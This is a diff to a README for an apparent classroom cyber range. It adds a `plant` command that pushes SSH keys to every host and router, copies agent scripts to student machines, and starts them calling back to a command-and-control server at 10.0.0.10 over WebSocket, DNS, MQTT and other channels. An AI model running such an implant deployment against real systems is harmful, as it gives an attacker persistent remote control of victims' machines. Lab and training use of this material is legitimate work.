@@ -152,7 +152,17 @@ python3 range.py fanout --hosts range-hosts.json --ssh-config range-ssh.conf --c
 python3 range.py watch --hosts range-hosts.json --ssh-config range-ssh.conf --student defender
 ```
 
-The first `ssh` takes the jump passwords. The master socket then stays up until you close it or the class is rebuilt. It does not expire. `keys` copies the public key on this account to every jump, both routers, and every host. Each one asks once. After that, this class does not ask again. Ping runs on the WAN router, so it is real ICMP inside the lab. Fanout replaces sshp. Watch opens a socket to every focused host and both LAN routers, then keeps printing who is logged in and the last lines of that student's history. The WAN router stays the path. `sessions` in the operator is a different list: only hosts where you started an agent. The bench builds `range-hosts.json` and `range-ssh.conf` for the class roster. Router SSH is port 20222. Hosts on 172.24.0.0/24 are port 22. A tun (`ssh -w`) would let the laptop itself ping, but the VYOS sshd has to allow `PermitTunnel`. The router ping does not need that.
+The first `ssh` takes the jump passwords. The master socket then stays up until you close it or the class is rebuilt. It does not expire. `keys` copies the public key on this account to every jump, both routers, and every host. Each one asks once. After that, this class does not ask again.
+
+`plant` does that key copy, then uses `scp` to put the right script on every student host and starts it. Linux gets `range.py`. Windows gets `range-agent.ps1` for TCP, HTTP, and WebSocket, and `range.py` for the other channels. The agent id is the last octet of the address (`172.24.10.180` is `180`). Routers are logged in as `atropia_admin` and receive the key only. VYOS does not run an agent. The operator has to already be running on the attacker. On that console, `sessions`, then `use 180`.
+
+```bash
+python3 range.py plant --hosts range-hosts.json --ssh-config range-ssh.conf \
+  --c2 10.0.0.10 --channel ws --token 'lab-token-change-me' --profile continuous \
+  --tcp-port 443 --http-port 80 --dns-port 53 --mqtt-port 1883 --ws-port 8070 --zone lab
+```
+
+Ping runs on the WAN router, so it is real ICMP inside the lab. Fanout replaces sshp. Watch opens a socket to every focused host and both LAN routers, then keeps printing who is logged in and the last lines of that student's history. The WAN router stays the path. `sessions` in the operator is a different list: only hosts where you started an agent. The bench builds `range-hosts.json` and `range-ssh.conf` for the class roster. Router SSH is port 20222. Hosts on 172.24.0.0/24 are port 22. A tun (`ssh -w`) would let the laptop itself ping, but the VYOS sshd has to allow `PermitTunnel`. The router ping does not need that.
 
 ## What Wireshark should show
 
